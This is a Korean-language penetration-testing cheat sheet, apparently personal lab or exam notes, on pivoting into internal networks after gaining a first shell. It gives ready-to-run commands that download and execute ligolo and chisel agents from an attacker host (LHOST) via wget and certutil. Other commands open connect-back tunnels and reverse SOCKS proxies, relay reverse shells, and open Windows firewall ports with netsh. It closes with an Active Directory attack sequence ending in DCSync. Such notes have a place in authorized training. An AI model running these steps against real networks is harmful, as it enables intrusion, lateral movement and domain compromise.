# 05. 피벗

내부망(172.16.x 등)이 첫 셸 뒤에 보이면. `No route to host` = 피벗 신호.
Kali 준비물: ligolo `agent`/`agent.exe` = `~/git/ligolo/`, `proxy` 동일 경로. chisel = `/var/www/html/chisel`.
⚠️ `LHOST` 는 타겟에 없다 → [[00. START]]의 IP를 박는다.

**뭘 쓸지 판단:**
| 상황 | 방법 |
|---|---|
| SSH 자격증명 있음 | **sshuttle**(제일 간편, VPN처럼) 또는 ssh -D |
| 자격증명 없고 셸만 (리눅스/Win) | **ligolo-ng**(에이전트 올림, 제일 강력·안정) |
| 에이전트 못 올림, 아웃바운드만 | **chisel** reverse SOCKS |
| 내부 서비스 «하나»만 | ssh -L 로컬포워드 / socat |
| Windows에 도구 못 올림 | 내장 **netsh portproxy** |
| 3계층(SRV 뒤 또 내부) | ligolo 2차 인터페이스 더블피벗 |

## 0. 내부 대역 확인 — 피벗 전에
```bash
# 타겟(리눅스): ip a; ip route; arp -a; cat /etc/hosts
# 타겟(Windows): ipconfig /all & route print & arp -a
```
새 대역 나오면 그게 라우팅할 목적지다(예 172.16.138.0/24).

## 1. ligolo-ng (권장 — 실사용 문법 v0.8)

**Kali (프록시):**
```bash
cd ~/git/ligolo
./proxy -selfcert
```
프록시 콘솔 안에서:
```
interface_create --name ligolo
start --tun ligolo
```
새 터미널에서 라우트 추가(대역은 0절에서 확인한 것):
```bash
sudo ip route add 172.16.138.0/24 dev ligolo
```

**타겟에 agent 올려 Kali로 connect-back:**
```bash
# 리눅스 타겟
wget http://LHOST/agent -O /tmp/agent 2>/dev/null; chmod +x /tmp/agent
/tmp/agent -connect LHOST:11601 -ignore-cert
```
```cmd
:: Windows 타겟
certutil -urlcache -f http://LHOST/agent.exe C:\Windows\Temp\agent.exe
C:\Windows\Temp\agent.exe -connect LHOST:11601 -ignore-cert
```
프록시 콘솔에서 세션 잡기:
```
session          (연결된 agent 선택)
start            (터널 시작. 안 하면 linkdown)
```
이제 Kali에서 **내부 IP로 직접** nmap·evil-winrm·crackmapexec 가 나간다.
```bash
nmap -sT -Pn -p- 172.16.138.10        # 피벗 통해 직접
```
**내부 호스트에서 Kali로 리버스셸을 되받으려면** — ligolo에 리스너를 얹는다(이게 없으면 내부 익스의 셸이 안 돌아옴):
```
# 프록시 콘솔에서 (세션 선택된 상태):
listener_add --addr 0.0.0.0:4444 --to 127.0.0.1:4444 --tcp
# → 내부 페이로드 LHOST=<agent내부IP> LPORT=4444, Kali에서 nc -lvnp 4444
```
**더블 피벗**(SRV22 뒤 3계층): SRV22에 agent 하나 더 올리고 `interface_create --name ligolo1` → 그 대역 route_add.

## 2. chisel (SOCKS — ligolo 안 될 때)

**Kali (서버):**
```bash
/var/www/html/chisel server -p 8000 --reverse
```
**타겟 (클라이언트 → SOCKS 역터널):**
```bash
wget http://LHOST/chisel -O /tmp/chisel 2>/dev/null; chmod +x /tmp/chisel
/tmp/chisel client LHOST:8000 R:1080:socks
```
Kali에서 proxychains 로:
```bash
# /etc/proxychains4.conf 끝줄: socks5 127.0.0.1 1080
proxychains -q nmap -sT -Pn -p445,3389,5985 172.16.138.10
proxychains -q evil-winrm -i 172.16.138.10 -u user -p pass
```

## 3. SSH 터널 (자격증명 있고 SSH 되면 — 가장 안정)
```bash
# 동적 SOCKS
ssh -D 1080 -N -f user@$T          # → proxychains
# 로컬 포워드 (특정 내부 서비스 하나)
ssh -L 8080:172.16.138.10:80 -N -f user@$T   # localhost:8080 → 내부 80
# 역방향 (내부→Kali)
ssh -R 4444:127.0.0.1:4444 -N user@$T
```
**sshuttle** — SSH 자격증명 있으면 제일 간편(VPN처럼 전 대역 라우팅, proxychains 불필요):
```bash
sshuttle -r user@$T 172.16.138.0/24 --ssh-cmd "ssh -o StrictHostKeyChecking=no"
```

## 4. 포트 포워드 단발 (socat / plink / netsh)
```bash
# 타겟(리눅스): 내부 3389를 타겟 9999로 노출
socat TCP-LISTEN:9999,fork TCP:172.16.138.10:3389 &
# → Kali에서 $T:9999 로 접속
```
```cmd
:: 타겟(Windows, 도구 못 올릴 때 내장 netsh) — 내부 3389를 이 호스트 9999로
netsh interface portproxy add v4tov4 listenport=9999 connectaddress=172.16.138.10 connectport=3389
netsh advfirewall firewall add rule name=fw dir=in action=allow protocol=TCP localport=9999
:: 정리: netsh interface portproxy reset
```

## 4b. 내부 웹페이지를 브라우저로 보기
피벗 뒤 내부 웹(로그인·업로드 UI 등)을 눈으로 봐야 할 때:
```
① ligolo로 route 잡혀 있으면 → Kali 브라우저에 내부IP 그대로: http://172.16.138.10/   (프록시 불필요)
② SOCKS(chisel/ssh -D 1080)면 → 브라우저 프록시를 SOCKS5 127.0.0.1:1080 (FoxyProxy)
                                  → 그다음 http://172.16.138.10/
③ 한 페이지만 → 로컬 포워드: ssh -L 8000:172.16.138.10:80 -N user@$T → http://localhost:8000
```
```bash
proxychains -q curl -s http://172.16.138.10/          # 빠른 확인은 curl
proxychains -q firefox http://172.16.138.10/ &        # SOCKS면 브라우저도 proxychains로 띄움
```
⚠️ Burp를 쓰려면 Burp 업스트림 프록시를 SOCKS 1080으로 설정 → 브라우저는 Burp로.

## 5. AD 세트 루프 — 막히면 이 순서
자격증명 1개 → BloodHound + Kerberoast + AS-REP → 엣지를 기법으로 → 측면이동 → **새 자격증명 무조건 재투입** → DCSync/DA. 전체: [[03. AD 공격 기법]]

빠른 에러 진단:
| 에러 | 해결 |
|---|---|
| `No route to host` | VPN 끊김 or 내부망 → 위 피벗 |
| `KRB_AP_ERR_SKEW` | `sudo rdate -n <DC>` 시간 동기 (ntpdate 없음, rdate 있음) |
| `KDC_ERR_S_PRINCIPAL_UNKNOWN` | `/etc/hosts` 에 DC FQDN 등록 |
| `Connection refused` | hosts가 틀린 IP → `getent hosts <name>` |
